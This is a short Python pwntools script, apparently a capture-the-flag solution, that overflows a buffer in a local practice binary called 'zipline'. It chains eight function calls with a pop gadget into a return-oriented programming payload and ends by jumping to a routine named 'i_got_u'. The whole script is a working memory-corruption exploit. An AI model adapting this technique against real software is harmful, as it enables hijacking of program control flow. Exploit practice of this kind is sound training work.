from pwn import *
import time
offset = 22 
POP = 0x08049021
funcs = [(0x08049216, 0x0804a008), # AIR: CLOD
        (0x080492c4, 0x0804a04c), #LAND: LAND 
        (0x0804931b, 0x0804a069), #UNDR: UNDR
        (0x08049372, 0x0804a086), #LIMBO 
        (0x080493c9, 0x0804a0a3), #HELL 
        (0x08049420, 0x0804a0c0), #MINE 
        (0x08049477, 0x0804a0dd), #BROK
        (0x0804926d, 0x0804a02f) #watr 
        ] 
the_chain = b"A"*offset 
u_got = 0x08049569 # this is the address of call sym.i_got_u, the actual address of i_got_u has a '\n' in its lil endian representation so it cuts our payload short 
for p in funcs: 
    the_chain += p32(p[0]) + p32(POP) + p32(p[1]) 
the_chain += p32(u_got)
p=process("./zipline")
p.sendline(the_chain)
time.sleep(1)
print(p.recv())
